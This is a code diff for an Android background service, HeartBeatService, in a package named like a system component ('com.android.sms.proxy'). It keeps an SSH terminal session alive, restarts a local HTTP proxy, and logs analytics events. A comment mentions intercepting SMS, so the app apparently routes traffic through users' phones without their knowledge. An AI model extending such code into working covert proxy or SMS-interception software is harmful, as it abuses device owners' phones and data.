@@ -17,6 +17,7 @@ import android.text.TextUtils;
 import android.util.Log;
 
 import com.android.sms.proxy.entity.BindServiceEvent;
+import com.android.sms.proxy.entity.MessageEvent;
 import com.android.sms.proxy.entity.NativeParams;
 import com.flurry.android.FlurryAgent;
 import com.oplay.nohelper.utils.Util_Service;
@@ -29,8 +30,6 @@ import org.connectbot.service.TerminalBridge;
 import org.connectbot.service.TerminalManager;
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
-import org.littleshoot.proxy.HttpProxyServer;
-import org.littleshoot.proxy.impl.DefaultHttpProxyServer;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -50,7 +49,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 	private ScheduledExecutorService mExecutorService;
 	private ScheduledExecutorService mCheckExecutorService;
 	private ScheduledFuture mScheduledFuture;
-	private static final long MESSAGE_INIT_DELAY = 2;//Message 推送延迟
+	private static final long MESSAGE_INIT_DELAY = 30 ;//Message 推送延迟
 	public static long MESSAGE_DELAY = 20;//Message 轮询消息
 	private HeartBeatRunnable mHeartBeatRunnable = null;
 	private CheckServiceRunnable mCheckServiceRunnable = null;
@@ -61,7 +60,6 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 	//记录当前建立号的连接，方便在拦截短信
 	public static long recordConnectTime = 0;
 	private static HeartBeatService instance;
-
 
 	public static HeartBeatService getInstance() {
 		return instance;
@@ -104,6 +102,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 					Log.d(TAG, "重新启动scheduledFuture");
 
 				}
+				mExecutorService.schedule(new GetMsgRunnable(this),10,TimeUnit.SECONDS);
 				mScheduledFuture = mExecutorService.scheduleWithFixedDelay(mHeartBeatRunnable, MESSAGE_INIT_DELAY,
 						duration,
 						TimeUnit.SECONDS);
@@ -301,7 +300,9 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 				if (binder == null) {
 					recordConnectTime = System.currentTimeMillis();
 					startTerminalService();
-					sureServiceIsRunning(TerminalManager.class.getCanonicalName());
+					final String message = "start terminal service!!!";
+					EventBus.getDefault().post(new MessageEvent(message));
+//					sureServiceIsRunning(TerminalManager.class.getCanonicalName());
 				}
 			}
 		} catch (Throwable e) {
@@ -320,9 +321,10 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 				Map<String, String> map = new HashMap<>();
 				map.put(NativeParams.KEY_SSH_CONNECT_TIME, String.valueOf(buildTime));
 				FlurryAgent.logEvent(NativeParams.EVENT_SSH_CONNECT_SUCCESS, map);
-//				//关闭代理服务先！！！！！！！！！！
-//				destroyProxyService();
-//				initProxyService();
+				//关闭代理服务先！！！！！！！！！！
+
+				destroyProxyService();
+				initProxyService();
 //				HttpProxyServer server = DefaultHttpProxyServer.bootstrap()
 //						.withPort(8964)
 //                        .withFiltersSource(new HttpFiltersSourceAdapter() {
@@ -358,11 +360,11 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 //                            }
 //                        })
 //						.start();
-                HeartBeatRunnable.isSSHConnected = true;
-				HttpProxyServer server =
-						DefaultHttpProxyServer.bootstrap()
-								.withPort(8964) // for both HTTP and HTTPS
-								.start();
+				//HeartBeatRunnable.isSSHConnected = true;
+//				HttpProxyServer server =
+//						DefaultHttpProxyServer.bootstrap()
+//								.withPort(8964) // for both HTTP and HTTPS
+//								.start();
 			}
 		} catch (Throwable e) {
 			FlurryAgent.onError(TAG, "", e);
@@ -407,6 +409,18 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 							if (DEBUG) {
 								Log.d(TAG, "服务已经存在,不需重启了");
 							}
+							try {
+								destroyProxyService();
+								if(DEBUG){
+									Log.d(TAG,"服务已存在，先kill该服务，再重启服务！！！！！");
+								}
+								Thread.sleep(2000);
+								startProxyService();
+							} catch (Throwable e) {
+								if (DEBUG) {
+									Log.e(TAG, e.fillInStackTrace().toString());
+								}
+							}
 						}
 					}
 				} catch (InterruptedException e) {
@@ -438,6 +452,9 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 			HeartBeatRunnable.isSSHConnected = false;
 		}
 
+		if (isProxySuccess) {
+			EventBus.getDefault().post(new MessageEvent("proxy service start success!!!"));
+		}
 		Map<String, String> map = new HashMap<>();
 		map.put(NativeParams.KEY_PROXY_CONNECT_SUCCESS, String.valueOf(isProxySuccess));
 		FlurryAgent.logEvent(NativeParams.EVENT_START_PROXY, map);
